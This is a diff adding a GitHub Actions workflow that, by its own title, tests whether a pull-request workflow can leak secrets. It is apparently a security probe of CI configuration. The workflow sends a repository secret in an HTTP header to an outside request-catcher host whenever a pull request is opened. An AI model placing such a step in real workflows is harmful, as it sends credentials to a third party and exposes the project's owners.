@@ -1,0 +1,22 @@
+name: Test if a PR workflow can compromise secrets
+on:
+  pull_request:
+    types:
+      - opened
+    branches:
+      - test-environment-workflow
+
+jobs:
+  testenv:
+    runs-on: ubuntu-latest
+    environment: publish
+    steps:
+      - uses: fjogeleit/http-request-action@v1
+        with:
+          url: 'https://testxkit.requestcatcher.com/test'
+          method: 'POST'
+          customHeaders: '{"Content-Type": "application/json", "secret": "$SECRET_HEADER", "normal": "$NORMAL_HEADER"}'
+          data: '{"key_1": "value_1", "key_2": "value_2"}'
+        env:
+          SECRET_HEADER: ${{ secrets.SECRET_HEADER }}
+          NORMAL_HEADER: "normal stuff is here"
